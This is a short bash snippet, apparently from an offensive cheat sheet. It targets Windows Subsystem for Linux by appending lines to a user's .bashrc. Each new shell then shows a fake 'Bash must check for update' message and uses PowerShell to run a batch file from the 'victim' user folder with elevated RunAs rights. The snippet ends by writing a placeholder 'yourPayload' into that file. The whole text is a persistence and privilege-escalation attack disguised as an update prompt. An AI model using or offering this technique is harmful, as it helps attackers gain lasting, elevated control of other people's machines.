bash
cd
echo " echo \"Bash must check for update! \"" >> .bashrc
echo " /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command \"Start-Process c:\users\victim\BashUpdate.bat -Verb RunAs\"" >> .bashrc
echo " echo \"Bash updated! \"" >> .bashrc
exit
echo yourPayload > BashUpdate.bat
